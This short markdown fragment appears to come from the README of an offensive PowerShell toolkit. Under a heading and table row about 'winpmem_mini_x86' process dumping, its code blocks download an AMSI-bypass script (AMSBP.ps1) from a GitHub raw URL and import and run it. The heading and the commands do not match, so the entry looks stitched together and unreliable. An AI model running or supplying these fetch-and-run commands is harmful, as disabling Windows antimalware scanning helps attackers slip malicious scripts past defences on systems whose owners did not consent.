## winpmem_mini_x86.exe

|Function name|Description|Privileges|Notes|
|---|---|---|---|
|winpmem_mini_x86|Dump processes data|Administrator|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
```

```powershell
Import-Module -Name ".\AMSBP.ps1" -Force
AMSBP
```